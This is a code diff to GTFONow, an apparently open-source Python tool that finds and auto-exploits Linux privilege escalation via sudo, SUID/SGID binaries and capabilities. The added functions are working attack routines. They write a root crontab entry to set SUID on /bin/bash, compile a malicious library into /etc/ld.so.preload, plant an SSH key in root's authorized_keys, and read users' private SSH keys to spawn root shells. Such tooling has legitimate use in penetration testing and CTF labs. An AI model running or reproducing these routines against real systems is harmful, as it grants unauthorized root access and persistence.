@@ -15,7 +15,8 @@ import grp
 import pwd
 import logging
 import platform
-
+import time
+import select
 
 # SUDO_BINS_START
 sudo_bins = {
@@ -1844,7 +1845,8 @@ capabilities = {
 }
 # CAPABILITIES_END
 
-
+SUDO_NO_PASSWD = "Sudo NOPASSWD"
+SUID_SGID = "SUID/SGID Binary"
 try:
     input = raw_input
 except NameError:
@@ -1860,13 +1862,22 @@ class CustomLogger(logging.Logger):
     def __init__(self, name, level=logging.DEBUG):
         super(CustomLogger, self).__init__(name, level)
 
-        console_handler = logging.StreamHandler()
-        console_handler.setLevel(logging.DEBUG)
+        # Create a console handler and set its level to DEBUG
+        self.console_handler = logging.StreamHandler()
+        self.console_handler.setLevel(logging.DEBUG)
 
+        # Create and set the custom formatter
         formatter = CustomFormatter()
-        console_handler.setFormatter(formatter)
+        self.console_handler.setFormatter(formatter)
 
-        self.addHandler(console_handler)
+        # Add the handler to the logger
+        self.addHandler(self.console_handler)
+
+    def set_level(self, level):
+        # Set the logger's level
+        self.setLevel(level)
+        # Update the console handler's level
+        self.console_handler.setLevel(level)
 
 
 class CustomFormatter(logging.Formatter):
@@ -1883,10 +1894,51 @@ class CustomFormatter(logging.Formatter):
 logging.setLoggerClass(CustomLogger)
 
 log = logging.getLogger(__name__)
+log.set_level(logging.INFO)
 
 
-def arbitrary_file_read(binary, payload):
-    ssh_key_privesc(payload)
+def execute_command(command):
+    """
+    Executes a given command using subprocess and returns the output.
+    Compatible with Python 2.* and 3.*.
+
+    :param command: Command to execute as a string or list.
+    :return: A tuple containing the standard output and standard error.
+    """
+    try:
+        if isinstance(command, list):
+            command = " ".join(command)
+
+        log.debug("Executing %s", command)
+
+        process = subprocess.Popen(
+            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+
+        output, error = process.communicate()
+
+        if sys.version_info[0] == 3:
+            output = output.decode('utf-8') if output else output
+            error = error.decode('utf-8') if error else error
+
+        if output:
+            log.debug("Output: %s", output)
+        if error:
+            log.error("Error: %s", error)
+        return output, error
+
+    except OSError as e:
+        return None, "OS error occurred: " + str(e)
+
+
+def arbitrary_file_read(binary, payload, user="root"):
+    """Exploit arbitrary file read vulnerability.
+
+    Args:
+        binary (str): Binary to exploit.
+        payload (str): Exploit payload.
+    """
+    if is_service_running("ssh"):
+        ssh_key_privesc(payload, user)
     log.info("Performing arbitrary file read with %s", binary)
     print("Enter the file that you wish to read. (eg: /etc/shadow)")
     file_to_read = input("> ")
@@ -1894,55 +1946,86 @@ def arbitrary_file_read(binary, payload):
     os.system(payload)
 
 
-def arbitrary_file_write(binary, payload):
+def arbitrary_file_write(binary, payload, risk, user="root"):
+    """Exploit arbitrary file write.
+
+    Args:
+        binary (str): Binary to exploit.
+        payload (str): Exploit payload.
+        user (str): User to exploit.
+    """
     log.info("Performing arbitrary file write with %s", binary)
+
+    if risk == 2:
+        if is_service_running("ssh"):
+            ssh_write_privesc(payload, user)
+        if user == "root":
+            if is_service_running("cron"):
+                cron_priv_esc(payload)
+            ld_preload_exploit(binary, payload)
+
     print("Create a file named " + GREEN + "input_file" +
           RESET+" containing the file content")
     log.info("Spawning temporary shell to create file, type 'exit' when done")
-    os.system("bash")
     print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
     file_to_write = input("> ")
     payload = payload.replace("file_to_write", file_to_write)
     os.system(payload)
 
 
-def exploit_sudo(binary, payload):
-    if "file_to_read" in payload:
-        arbitrary_file_read(binary, payload)
-    elif "file_to_write" in payload:
-        arbitrary_file_write(binary, payload)
-    else:
-        log.info("Spawning root shell")
-        os.system(payload)
+def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root"):
+    """Exploit a binary.
 
+    Args:
+        binary (str): Binary to exploit.
+        payload (str): Exploit payload.
+        binary_path (str, optional): Path to binary.. Defaults to None.
+        user (str, optional): User to exploit. Defaults to "root".
+    """
 
-def exploit(binary,  payload, binary_path=None):
+    if exploit_type == SUDO_NO_PASSWD and user:
+        payload = payload.replace("sudo", "sudo -u " + user)
+
     if binary_path:
         payload = payload.replace("./"+binary, binary_path)
     else:
         payload = payload.replace("./"+binary, binary)
     if "file_to_read" in payload:
-        arbitrary_file_read(binary, payload)
+        arbitrary_file_read(binary, payload, user)
     elif "file_to_write" in payload:
-        arbitrary_file_write(binary, payload)
+        arbitrary_file_write(binary, payload, risk, user)
     else:
-        log.info("Spawning root shell")
+        log.info("Spawning %s shell", user)
         os.system(payload)
 
 
 def get_sudo_l_output():
+    """Gets the output of sudo -l command.
+
+    Returns:
+        str: Output of sudo -l command.
+    """
     try:
         result = subprocess.run(
-            ['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)
+            ['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=1)
         return result.stdout
     except subprocess.TimeoutExpired:
         print("Command timed out. User may need to enter a password.")
+        return
     except Exception as e:
         log.error(str(e))
-        return ""
+        return
 
 
 def check_sudo_binaries(sudo_l_output):
+    """Checks for privilege escalations via binaries in sudo -l output.
+
+    Args:
+        sudo_l_output (str): Output of sudo -l command.
+
+    Returns:
+        list: Returns a list of potential privilege escalations.
+    """
     priv_escs = []
     all_matches = re.findall(r'\(.*\) (.*)', sudo_l_output)
     for match in all_matches:
@@ -1966,10 +2049,20 @@ def check_sudo_binaries(sudo_l_output):
 
 
 def check_sudo_nopasswd_binaries(sudo_l_output):
+    """Checks for privilege escalations via NOPASSWD binaries in sudo -l output.
+
+    Args:
+        sudo_l_output (str): Output of sudo -l command.
+
+    Returns:
+        list: Returns a list of potential privilege escalations.
+    """
     priv_escs = []
-    matches = re.findall(r'\(.*\) NOPASSWD: (.*)', sudo_l_output)
-    for match in matches:
-        binaries = match.split(', ')
+    matches = re.findall(r'\(([^)]+)\) NOPASSWD: (.*)', sudo_l_output)
+    for user, command_paths in matches:
+        if user.lower() == "all":
+            user = "root"
+        binaries = command_paths.split(', ')
         for binary_path in binaries:
             binary = binary_path.split('/')[-1]
             if binary not in sudo_bins.keys():
@@ -1977,35 +2070,15 @@ def check_sudo_nopasswd_binaries(sudo_l_output):
 
             payloads = sudo_bins.get(binary)
             priv_esc = {
+                "SudoUser": user,
                 "Binary": binary,
                 "Path": binary_path,
                 "Payloads": payloads,
-                "Type": "Sudo NOPASSWD"
+                "Type": SUDO_NO_PASSWD
             }
             priv_escs.append(priv_esc)
 
     return priv_escs
-
-
-def sudo_brute():
-    """If cannot read sudo -l, brute force sudo binary list to guess sudo binaries."""
-    print("Enter sudo password, leave blank to check for NOPASSWD breakout (slow)")
-    sudo_password = "not_a_real_password"
-    potential_privesc = []
-    for binary in sudo_bins.keys():
-        cmd = subprocess.Popen("{ echo '" + sudo_password + "'; } | sudo -kS " +
-                               binary, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        res, err = cmd.communicate()
-        if b"is not allowed to execute" in err:
-            log.error("No sudo permissions for %s", binary)
-        elif b"command not found" in err:
-            continue
-        elif b"no password was provided" in err:
-            continue
-        else:
-            log.warning("Potential sudo privilege escalation via %s", binary)
-            potential_privesc.append(binary)
-    return potential_privesc
 
 
 def is_linux():
@@ -2013,7 +2086,7 @@ def is_linux():
     Check if the host operating system is a variant of Linux.
 
     Returns:
-    bool: True if the OS is Linux, False otherwise.
+        bool: True if the OS is Linux, False otherwise.
     """
     return platform.system() == "Linux"
 
@@ -2021,6 +2094,9 @@ def is_linux():
 def check_suid_bins():
     """
     Checks if any binaries in PATH are suid or sgid binaries and referenced in GTFOBins.
+
+    Returns:
+        list: A list of potential privilege escalations.
     """
     potential_privesc = []
     for binary, payloads in suid_bins.items():
@@ -2037,7 +2113,7 @@ def check_suid_bins():
                 "Binary": binary,
                 "Path": binary_path,
                 "Payloads": payloads,
-                "Type": "SUID/SGID Binary",
+                "Type": SUID_SGID,
                 "SUID": file_properties.get("Owner") if is_suid else None,
                 "SGID": file_properties.get("Group") if is_sgid else None
             }
@@ -2059,24 +2135,123 @@ def check_capability(binary_path, capability):
     Returns:
     bool: True if the capability is set, False otherwise.
     """
-    try:
-        # Execute getcap command
-        result = subprocess.run("getcap "+binary_path,
-                                capture_output=True, shell=True, text=True, check=True)
 
-        # Parse the output for the desired capability
-        if capability in result.stdout:
+    if get_binary_path("getcap") is None:
+        log.error("getcap not found in PATH, cannot escalate using capabilities")
+        return
+
+    try:
+        result, error = execute_command(["getcap", binary_path])
+
+        if capability in result:
             return True
         return False
 
     except subprocess.CalledProcessError as e:
-        # Handle errors (e.g., binary not found, getcap not installed)
         print(f"Error: {e}")
         return False
 
 
+def is_service_running(service):
+    """
+    Check if the cron service is running.
+
+    Returns:
+    bool: True if cron is running, False otherwise.
+    """
+
+    if get_binary_path("service"):
+        result = execute_command(["service", service, "status"])
+        if " is running" in result:
+            return True
+    if get_binary_path("systemctl"):
+        result = execute_command(["systemctl", "status", service])
+        if "active (running)" in result:
+            return True
+    return False
+
+
+def cron_priv_esc(payload):
+    """Turns arbitrary write into shell by writing to cron.
+
+    Args:
+        payload (str): Exploit payload.
+    """
+    CRONTAB_PATHS = ["/etc/cron.d/", "/etc/cron.daily/", "/etc/cron.hourly/",
+                     "/etc/cron.monthly/", "/etc/cron.weekly/", "/var/spool/cron/crontabs/"]
+
+    file_to_write = "/var/spool/cron/crontabs/root"
+    payload = payload.replace("file_to_write", file_to_write)
+    payload = payload.replace("DATA", "* * * * * chmod u+s /bin/bash")
+    log.debug("Executing %s", payload)
+    log.info("Writing payload to crontab %s", file_to_write)
+    os.system(payload)
+    log.info("Waiting for cron to execute payload")
+    count = 0
+    while True:
+        if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
+            log.info("SUID bit set on /bin/bash, spawning root shell")
+            os.system("/bin/bash -p")
+            break
+        time.sleep(1)
+        count = count + 1
+        if count > 80:
+            log.error("Cron did not execute payload, something went wrong.")
+            break
+
+
+def ld_preload_exploit(binary, payload):
+    """Turns arbitrary write into shell by writing to /etc/ld.so.preload
+
+    Args:
+        Binary (str): Binary to exploit.
+        payload (str): Exploit payload.
+    """
+    if get_binary_path("gcc") is None:
+        log.error("gcc not found in PATH, cannot escalate using LD_PRELOAD")
+        return
+
+    lib_src = """
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    __attribute__ ((__constructor__))
+    void dropshell(void){
+        chown("/bin/bash", 0, 0);
+        chmod("/bin/bash", 04755);
+        unlink("/etc/ld.so.preload");
+        printf("Complete.");
+    }
+    """
+
+    f = open("/tmp/libpwn.c", "w")
+    f.write(lib_src)
+    f.close()
+    execute_command("gcc -w -shared -o /tmp/libpwn.so /tmp/libpwn.c")
+
+    # f = open("/tmp/libpwn.so", "rb")
+    # binary_data = f.read()
+    # lib_data = ''.join(f'\\x{byte:02x}' for byte in binary_data)
+    # payload_1 = payload.replace("DATA", lib_data)
+    # payload_1 = payload_1.replace("file_to_write", "/lib/libgtfo.so")
+    # payload_1 = payload_1.replace("echo", "echo -n -e")
+
+    payload = re.sub("data", "/tmp/libpwn.so", payload, flags=re.IGNORECASE)
+    payload = payload.replace("file_to_write", "/etc/ld.so.preload")
+    execute_command(payload)
+    execute_command(binary + " --help >/dev/null 2>&1")
+
+    if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
+        log.info("SUID bit set on /bin/bash, spawning root shell")
+        os.system("/bin/bash -p")
+
+
 def check_cap_bins():
     """Checks if any binaries in PATH are have vulnerable capabilities referenced in GTFOBins."""
+
+    if get_binary_path("getcap") is None:
+        log.error("getcap not found in PATH, cannot escalate using capabilities")
+        return []
 
     potential_privesc = []
     for binary, payloads in capabilities.items():
@@ -2101,10 +2276,16 @@ def check_cap_bins():
 
 
 def check_cap_full_disk():
-    """Find binaries across the whole system with exploitable capabilities set that are referenced in GTFOBins."""
-    cmd = subprocess.Popen("getcap -r / 2>/dev/null", shell=True,
-                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    res, err = cmd.communicate()
+    """Checks if any binaries on the filesystem have vulnerable capabilities
+
+    Returns:
+        list: Returns a list of potential privilege escalations.
+    """
+
+    if get_binary_path("getcap") is None:
+        log.error("getcap not found in PATH, cannot escalate using capabilities")
+        return []
+    res, err = execute_command("getcap -r / 2>/dev/null")
     potential_privesc = []
 
     for line in res.splitlines()[:-1]:
@@ -2132,8 +2313,44 @@ def check_cap_full_disk():
     return potential_privesc
 
 
+def ssh_write_privesc(payload, user="root"):
+    """Turns arbitrary write into shell by writing to user's SSH key
+
+    Args:
+        payload (str): Exploit payload
+        user (str, optional): User to exploit. Defaults to "root".
+    """
+
+    if get_binary_path("ssh-keygen") is None:
+        log.error("ssh-keygen not found in PATH, cannot escalate using SSH key")
+        return
+
+    if user == "root":
+        home_dir = "/root"
+    else:
+        home_dir = "/home/"+user
+    log.info("Attempting to escalate using root's SSH key")
+
+    execute_command("ssh-keygen -N '' -f /tmp/gtfokey")
+    with open("/tmp/gtfokey.pub", "r") as f:
+        pub_key = f.read()
+        payload = payload.replace("DATA", pub_key)
+        payload = payload.replace(
+            "file_to_write", home_dir+"/.ssh/authorized_keys")
+
+        res, err = execute_command(payload)
+        if not err:
+            os.system(
+                "ssh -o StrictHostKeyChecking=no -i /tmp/gtfokey "+user+"@localhost")
+
+
 def ssh_key_privesc(payload, user="root"):
-    """Attempts to escalate privileges for arbitrary file reads using user's SSH key"""
+    """Turns arbitrary read into shell by reading user's SSH key.
+
+    Args:
+        payload (str): Exploit payload.
+        user (str, optional): User to exploit. Defaults to "root".
+    """
 
     key_names = ["id_dsa", "id_ed25519", "id_rsa", "id_ecdsa"]
 
@@ -2146,13 +2363,9 @@ def ssh_key_privesc(payload, user="root"):
     for key in key_names:
         path = home_dir+"/.ssh/"+key
         exploit_payload = payload.replace("file_to_read", path)
-        cmd = subprocess.Popen(exploit_payload,
-                               shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        res, err = cmd.communicate()
-        if err:
-            log.error(err.decode("utf-8"))
-        else:
-            priv_key = res.decode("ascii")
+        res, err = execute_command(exploit_payload)
+        if not err:
+            priv_key = res
             if "encrypted" in priv_key.lower():
                 log.error("Key %s is encrypted, skipping", path)
             log.info("Spawning %s SSH shell using %s", user, path)
@@ -2161,6 +2374,14 @@ def ssh_key_privesc(payload, user="root"):
 
 
 def payload_type(payload):
+    """Determine payload type.
+
+    Args:
+        payload (str): Exploit payload.
+
+    Returns:
+        str: Payload type, eg shell, or arbitrary read.
+    """
     if "file_to_read" in payload:
         return "Arbitrary read"
     elif "file_to_write" in payload:
@@ -2195,10 +2416,10 @@ def check_suid_sgid(file_path):
     Check if the SUID or SGID bit is set on the file at the given path and return the owner and group.
 
     Args:
-    file_path (str): The path to the file.
+        file_path (str): The path to the file.
 
     Returns:
-    dict: A dictionary with the SUID and SGID status, and owner and group of the file.
+        dict: A dictionary with the SUID and SGID status, and owner and group of the file.
     """
     try:
         file_stat = os.stat(file_path)
@@ -2224,10 +2445,10 @@ def is_binary_in_path(binary_path):
     Check if the given binary path is in the user's PATH.
 
     Args:
-    binary_path (str): The full path to the binary.
+        binary_path (str): The full path to the binary.
 
     Returns:
-    bool: True if the binary is in the PATH, False otherwise.
+        bool: True if the binary is in the PATH, False otherwise.
     """
     binary_name = os.path.basename(binary_path)
 
@@ -2239,16 +2460,15 @@ def is_binary_in_path(binary_path):
 
 
 def check_suid_full_disk():
-    """Performs a full system search for binaries not found in user's PATH that are suid or sgid."""
-    cmd = subprocess.Popen("find / -perm -4000 -type f 2>/dev/null",
-                           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    res, err = cmd.communicate()
-    res = res.decode("ascii")
+    """Searches files system for vulnerable suid and sguid binaries.
+
+    Returns:
+        list: Returns a list of potential privilege escalations.
+    """
+
+    res, err = execute_command("find / -perm -4000 -type f 2>/dev/null")
     binary_paths = res.split("\n")[:-1]
-    cmd = subprocess.Popen("find / -perm -2000 -type f 2>/dev/null",
-                           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    res, err = cmd.communicate()
-    res = res.decode("ascii")
+    res, err = execute_command("find / -perm -2000 -type f 2>/dev/null")
     sgid_binaries = res.split("\n")[:-1]
     new_binaries = set(binary_paths) - set(sgid_binaries)
     binary_paths.extend(new_binaries)
@@ -2258,7 +2478,6 @@ def check_suid_full_disk():
         if is_binary_in_path(binary_path):
             continue
         binary = binary_path.split("/")[-1]
-
         if binary in suid_bins.keys():
             file_properties = check_suid_sgid(binary_path)
             is_suid = file_properties.get("SUID")
@@ -2267,7 +2486,7 @@ def check_suid_full_disk():
                 "Binary": binary,
                 "Path": binary_path,
                 "Payloads": suid_bins[binary],
-                "Type": "SUID/SGID Binary",
+                "Type": SUID_SGID,
                 "SUID": file_properties.get("Owner") if is_suid else None,
                 "SGID": file_properties.get("Group") if is_sgid else None
             }
@@ -2296,90 +2515,139 @@ def print_banner():
     print("https://github.com/Frissi0n/GTFONow\n")
 
 
-def main():
-
+def parse_arguments():
     parser = argparse.ArgumentParser(
         description='GTFONow: Automatic privilege escalation using GTFOBins')
-    parser.add_argument('--level', default=1, choices=range(1, 3), type=int,
-                        help='Level of checks to perform. By default GTFONow performs a quick scan (level 1). Each level increases duration and noisyness of checks.')
-    parser.add_argument("--risk", default=1, choices=range(0, 2),
-                        type=int, help="Risk level of exploit to perform. Default risk level (1), will auto exploit arbitrary file reads, and obtain shells. Risk level 2 will modify files on the system by auto exploiting arbitrary file writes, risk level 2 is only recommended for CTFs or if you know what you're doing.")
-    parser.add_argument("--sudo_password",
-                        action="store_true", help="Sudo password mode, will prompt for sudo password.")
+    parser.add_argument('--level', default=1, choices=range(1, 2), type=int,
+                        help='Level of checks to perform. Default level 1 for a quick scan.')
+    parser.add_argument("--risk", default=1, choices=range(1, 2),
+                        type=int, help="Risk level of exploit to perform. Default risk level 1 for safe operations.")
+    parser.add_argument("--sudo_password", action="store_true",
+                        help="If you know the sudo password, enable sudo_password mode for more privilege escalation options.")
     parser.add_argument('-v', '--verbose', action='store_true',
-                        default=False, help='Enable verbose output.')
-    args = parser.parse_args()
-    print_banner()
-    sudo_privescs = []
-    suid_privescs = []
-    cap_privescs = []
+                        help='Enable verbose output.')
+    return parser.parse_args()
 
-    if args.sudo_password:
-        print("Enter sudo password:")
-        sudo_password = getpass.getpass("> ")
+
+def get_sudo_password():
+    print("Enter sudo password:")
+    return getpass.getpass("> ")
+
+
+def perform_privilege_escalation_checks(args):
+    sudo_privescs, suid_privescs, cap_privescs = [], [], []
 
     suid_privescs = check_suid_bins()
-    sudo_l_output = get_sudo_l_output()
 
-    sudo_privescs = check_sudo_binaries(sudo_l_output)
-    sudo_privescs = sudo_privescs + check_sudo_nopasswd_binaries(sudo_l_output)
+    if get_binary_path("sudo"):
+        if args.sudo_password:
+            sudo_password = get_sudo_password()
+        sudo_l_output = get_sudo_l_output()
+        if sudo_l_output:
+            sudo_privescs.extend(check_sudo_binaries(sudo_l_output))
+            sudo_privescs.extend(check_sudo_nopasswd_binaries(sudo_l_output))
 
-    linux_system = is_linux()
-    if linux_system:
-        cap_privescs = check_cap_bins()
+    if is_linux():
+        cap_privescs.extend(check_cap_bins())
+
     if args.level >= 2:
-        suid_privescs = suid_privescs + check_suid_full_disk()
-    if args.level >= 2 and linux_system:
-        cap_privescs = cap_privescs + check_cap_full_disk()
-    if args.level == 3:
-        sudo_privescs = sudo_privescs + sudo_brute()
+        suid_privescs.extend(check_suid_full_disk())
+        cap_privescs.extend(check_cap_full_disk() if is_linux() else [])
 
-    priv_escs = sudo_privescs + suid_privescs + cap_privescs
+    return sudo_privescs, suid_privescs, cap_privescs
+
+
+def display_privilege_escalation_options(priv_escs):
     if not priv_escs:
-        log.warning("No privilege escalations found.")
+        logging.warning("No privilege escalations found.")
         sys.exit(1)
 
     print("\nChoose method to GTFO:")
-
-    payload_options = []
-    priv_escs = sudo_privescs + suid_privescs + cap_privescs
     for key, value in enumerate(priv_escs):
-        info = ""
+        print_formatted_priv_esc_option(key, value)
 
-        if value["Type"] == "SUID/SGID Binary":
-            owner = value.get("SUID")
-            group = value.get("SGID")
-            if owner:
-                if owner == "root":
-                    owner = RED + owner + RESET
-                else:
-                    owner = GREEN + owner + RESET
-                info = "SetUID binary as user " + owner + ". "
-            if group:
-                info = info + "SetGID binary as group " + group + "."
-        if value["Type"] == "Capability":
-            info = "Binary with capability " + value.get("Capability")
-        key = GREEN + "[" + str(key) + "] " + RESET + value["Binary"]
-        payload_options = []
-        for payload in value["Payloads"]:
-            payload_description = payload_type(payload)
-            if payload_description not in payload_options:
-                payload_options.append(payload_description)
-        payload_types = ", ".join(payload_options)
-        print(key)
-        print("  Path: " + value["Path"] + "\n  Type: " +
-              value["Type"] + "\n  Info: " + info + "\n  Payloads: " + payload_types)
-    choice = get_user_choice("> ")
-    priv_esc = priv_escs[choice]
 
-    print("\nChoose payload:")
+def print_formatted_priv_esc_option(key, value):
+    info = format_priv_esc_info(value)
+
+    # Initialize payload_options
+    payload_options = []
+
+    # Populate payload_options, ensuring no duplicates
+    for payload in value["Payloads"]:
+        payload_desc = payload_type(payload)
+        if payload_desc not in payload_options:
+            payload_options.append(payload_desc)
+
+    payload_types = ", ".join(payload_options)
+
+    print(GREEN+"["+str(key)+"] " + RESET + value['Binary'])
+    print("  Path: " + value["Path"] + "\n  Type: " +
+          value["Type"] + "\n  Info: " + info + "\n  Payloads: " + payload_types)
+
+
+def format_priv_esc_info(priv_esc):
+    """
+    Formats the privilege escalation information based on the type.
+    """
+    info = ""
+    priv_type = priv_esc["Type"]
+
+    if priv_type == SUDO_NO_PASSWD and priv_esc.get("SudoUser"):
+        user = priv_esc.get("SudoUser")
+        formatted_user = RED + user + RESET if user == "root" else GREEN + user + RESET
+        info = "Sudo NOPASSWD as user " + formatted_user
+
+    elif priv_type == SUID_SGID:
+        owner = priv_esc.get("SUID")
+        group = priv_esc.get("SGID")
+        if owner:
+            formatted_owner = RED + owner + RESET if owner == "root" else GREEN + owner + RESET
+            info = "SetUID binary as user " + formatted_owner
+        if group:
+            if info:
+                info += ", "
+            info += "SetGID binary as group " + group
+
+    elif priv_type == "Capability":
+        capability = priv_esc.get("Capability", "N/A")
+        info = f"Binary with capability {capability}"
+
+    return info
+
+
+def execute_payload(priv_esc, risk):
+    print("Choose payload:")
     for key, payload in enumerate(priv_esc["Payloads"]):
         print(GREEN + "[" + str(key) + "] " +
               RESET + priv_esc["Binary"] + GREEN + " " + payload_type(payload).lower() + RESET)
 
     choice = get_user_choice("> ")
-    exploit(binary=priv_esc["Binary"], payload=priv_esc["Payloads"][choice],
-            binary_path=priv_esc["Path"])
+    user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
+    if user:
+        exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
+                binary_path=priv_esc["Path"], user=user)
+    else:
+        exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
+                binary_path=priv_esc["Path"])
+
+
+def main():
+    args = parse_arguments()
+
+    if args.verbose:
+        log.set_level(logging.DEBUG)
+
+    print_banner()
+    sudo_privescs, suid_privescs, cap_privescs = perform_privilege_escalation_checks(
+        args)
+
+    priv_escs = sudo_privescs + suid_privescs + cap_privescs
+    display_privilege_escalation_options(priv_escs)
+
+    choice = get_user_choice("> ")
+    selected_priv_esc = priv_escs[choice]
+    execute_payload(selected_priv_esc, args.risk)
 
 
 if __name__ == "__main__":
